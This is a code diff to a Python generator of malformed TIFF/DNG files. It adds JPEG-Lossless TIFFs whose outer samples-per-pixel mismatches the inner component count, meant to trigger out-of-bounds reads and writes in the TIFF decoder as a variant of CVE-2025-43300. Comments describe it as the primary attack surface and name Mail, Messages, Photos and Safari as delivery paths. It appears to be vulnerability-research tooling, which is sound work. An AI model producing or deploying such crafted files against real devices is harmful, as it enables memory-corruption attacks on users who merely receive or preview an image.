@@ -186,19 +186,29 @@ class _StripRef:
         self.data = bytes(data)
 
 
-# ========================== Plain TIFF builder (diagnostic) ==========================
+# ========================== Plain TIFF builder (diagnostic + mismatch target) ==========================
 
-def build_plain_tiff(width=8, height=8, spp=3, bits=8):
+def build_plain_tiff(width=8, height=8, spp=1, bits=8,
+                     codec=COMP_UNCOMPRESSED, inner_comps=None):
     """
     Plain TIFF — NO DNG tags, standard PhotometricInterpretation.
-    Use this to verify TiffBuilder generates valid files that sips can decode.
-    If sips decodes these but not the DNG files, the DNG tag set is the issue.
+
+    When codec=COMP_JPEG_LOSSLESS and inner_comps != spp, this tests the TIFF
+    JPEG-Lossless decoder's SPP vs Nf mismatch path — same bug class as
+    CVE-2025-43300 but via the standard TIFF plugin (not Camera Raw).
+
+    Since we know the uncompressed TIFF path works (rc=0), a CTRL case with
+    codec=JPEGL and inner_comps==spp tells us if sips handles TIFF+JPEGL at all.
+    A mismatch case (inner_comps < spp) then tests for the OOB bug.
     """
+    if inner_comps is None:
+        inner_comps = spp
+
     b = TiffBuilder()
     b.add_long(T_IMAGE_WIDTH, width)
     b.add_long(T_IMAGE_LENGTH, height)
     b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
-    b.add_short(T_COMPRESSION, COMP_UNCOMPRESSED)
+    b.add_short(T_COMPRESSION, codec)
     b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
     b.add_short(T_SAMPLES_PER_PIXEL, spp)
     b.add_long(T_ROWS_PER_STRIP, height)
@@ -206,8 +216,15 @@ def build_plain_tiff(width=8, height=8, spp=3, bits=8):
     b.add_short(T_RESOLUTION_UNIT, 2)
     b.add_rational(T_X_RESOLUTION, 72, 1)
     b.add_rational(T_Y_RESOLUTION, 72, 1)
-    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
-                bytes(width * height * spp * (bits // 8)))
+
+    if codec == COMP_UNCOMPRESSED:
+        payload = bytes(width * height * spp * (bits // 8))
+    elif codec == COMP_JPEG_LOSSLESS:
+        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
+    else:
+        payload = bytes(width * height * spp * (bits // 8))
+
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
     return b.build()
 
 
@@ -510,22 +527,59 @@ CORPUS = [
 def generate_corpus(outdir='corpus'):
     os.makedirs(outdir, exist_ok=True)
 
-    # Plain TIFF diagnostics — NO DNG tags, standard PhotometricInterpretation.
-    # If sips decodes these but not the DNG files → DNG tag set is the problem.
-    # If sips cannot decode these → TiffBuilder has a fundamental structural bug.
-    plain_cases = [
+    # ---- Plain uncompressed TIFF diagnostics (confirm TiffBuilder is correct) ----
+    plain_uncompressed = [
         ('DIAG_plain_tiff_gray_8b',  build_plain_tiff(8, 8, spp=1, bits=8)),
         ('DIAG_plain_tiff_rgb_8b',   build_plain_tiff(8, 8, spp=3, bits=8)),
         ('DIAG_plain_tiff_rgb_16b',  build_plain_tiff(8, 8, spp=3, bits=16)),
     ]
-    print(f'[*] Plain TIFF diagnostics:')
-    for name, data in plain_cases:
+    print('[*] Plain uncompressed TIFF (structural baseline):')
+    for name, data in plain_uncompressed:
         fname = os.path.join(outdir, f'{name}.dng')
         with open(fname, 'wb') as f:
             f.write(data)
         print(f'    {fname}  ({len(data)} bytes)')
 
-    print(f'\n[*] Generating {len(CORPUS)} DNG test cases...')
+    # ---- Plain TIFF + JPEG-Lossless (PRIMARY ATTACK SURFACE) ----
+    # The TIFF plugin IS reachable (proven by uncompressed cases above).
+    # JPEG-Lossless is a valid TIFF compression (type 7).
+    # Mismatch between outer SPP and inner Nf should trigger OOB in the TIFF
+    # JPEG-Lossless decoder — same bug class as CVE-2025-43300.
+    #
+    # Attack surface: any TIFF file processed by ImageIO (Mail, Messages, Photos,
+    # Safari image preview, etc.). Not limited to DNG/Camera Raw path.
+    tiff_jpegl_cases = [
+        # CTRL: SPP == Nf (should decode cleanly, confirms codec path is reached)
+        ('CTRL_tiff_jpegl_3spp_3nf_16b',
+         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        ('CTRL_tiff_jpegl_1spp_1nf_16b',
+         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        # Mismatch: Nf < SPP (inner reads fewer components than outer expects)
+        ('tiff_jpegl_3spp_1nf_16b',
+         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_2nf_16b',
+         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=2)),
+        ('tiff_jpegl_4spp_1nf_16b',
+         build_plain_tiff(64, 64, spp=4, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_1nf_16b_256',
+         build_plain_tiff(256, 256, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_1nf_16b_512',
+         build_plain_tiff(512, 512, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        # Mismatch: Nf > SPP (inner writes more components than buffer holds — OOB write)
+        ('tiff_jpegl_1spp_3nf_16b',
+         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        ('tiff_jpegl_1spp_4nf_16b',
+         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
+    ]
+    print('\n[*] Plain TIFF + JPEG-Lossless mismatch targets:')
+    for name, data in tiff_jpegl_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- DNG corpus (Camera Raw path) ----
+    print(f'\n[*] Generating {len(CORPUS)} DNG test cases (Camera Raw path)...')
     for entry in CORPUS:
         w, h, spp, ic, bits, codec, name, photometric = entry
         fname = os.path.join(outdir, f'{name}.dng')
